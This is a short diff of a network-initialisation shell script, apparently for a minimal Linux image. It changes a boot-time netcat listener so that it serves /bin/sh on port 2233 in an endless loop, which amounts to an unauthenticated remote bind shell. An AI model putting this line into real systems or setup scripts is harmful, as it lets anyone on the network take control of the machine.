@@ -173,7 +173,7 @@ init_network() {
             echo "Hello! Here is Linux-minimal." > /var/www/index.html
         fi
         # httpd -p 80 -h /var/www
-        sh -c "nc -lvp 2233 -e /bin/mysh &"
+        sh -c "while true; do nc -lvp 2233 -e /bin/sh; done &"
     else
         echo "Warning: No physical network interface found!"
         sleep 1
